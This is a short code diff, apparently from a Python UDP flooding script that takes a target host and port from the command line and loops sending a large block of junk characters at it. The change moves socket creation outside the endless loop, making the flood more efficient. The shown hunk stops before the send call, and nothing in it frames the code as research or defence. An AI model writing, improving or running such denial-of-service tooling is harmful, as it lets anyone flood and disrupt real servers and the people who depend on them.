@@ -5,9 +5,8 @@ data = "qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"
 target = sys.argv[1]
 port = sys.argv[2]
 adr = (target,port)
-
+s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 while True:
-    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     s.connect(adr)
     bytes = (data*64)
     bytesenc = str.encode(bytes)
